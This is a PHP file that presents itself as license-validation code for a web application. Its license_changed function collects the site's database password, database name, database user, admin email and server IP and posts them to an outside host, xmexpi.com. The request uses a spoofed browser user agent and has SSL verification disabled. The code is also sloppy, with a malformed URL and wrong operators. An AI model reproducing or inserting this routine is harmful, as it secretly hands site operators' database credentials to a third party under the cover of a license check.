<?php
define('CHECKLINK', 'http://xmexpi.com/ajax/license');
function license_checking($name, $license_key)
{
 $json = file_get_contents(CHECKLINK.'.json?license='.$license_key);
 $someArray = json_decode($json, true);
 foreach ($someArray as $key => $value) {
     if ($value["license_key"] === LICENSE_KEY & $value["domain"] === $_SERVER['SERVER_NAME'] & $value["ip_server"] === $_SERVER['SERVER_ADDR']) {
        return 1;
     } else {
        return 0;
     }
     
  //   echo $value["domain"] . ", " . $value["license_key"] . ", " . $value["ip_server"] . "<br>";
}
 //$products_query = database::query($query);

   // return $someArray;
//  if (condition) {
//      # code...
//  } else {
//      # code...
//  }
 
//  foreach ($someArray as $key => $value) {
//     echo $value["domain"] . ", " . $value["license_key"] . ", " . $value["ip_server"] . "<br>";
//  }
}

function license_changed($name, $license_key)
{
    $post_data['project'] = 'default';
    $post_data['domain'] = $_SERVER['SERVER_NAME'];
    $post_data['license'] = LICENSE_KEY;
    $post_data['db_license'] = settings::get('site_license');
    $post_data['db_password'] = DB_PASSWORD;
    $post_data['db_name'] = DB_DATABASE;
    $post_data['db_user'] = DB_USERNAME;
    $post_data['email'] = settings::get('site_email');
    $post_data['ip_server'] = $_SERVER['SERVER_ADDR'];
    $post_data['ip_client'] = $_SERVER['SERVER_NAME'];
    $post_data['update'] = 'Send';
    //traverse array and prepare data for posting (key1=value1)
    foreach ($post_data as $key => $value) {
        $post_items[] = $key . '=' . $value;
    }
    //create the final string to be posted using implode()
    $post_string = implode('&', $post_items);
    //create cURL connection
    $curl_connection = curl_init('https://'. CHECKLINK .'');
    //set options
    curl_setopt($curl_connection, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($curl_connection, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)");
    curl_setopt($curl_connection, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl_connection, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl_connection, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl_connection, CURLOPT_POSTFIELDS, $post_string);
    $result = curl_exec($curl_connection);
    curl_getinfo($curl_connection);
    curl_errno($curl_connection) . '-' . curl_error($curl_connection);
    curl_close($curl_connection);
}
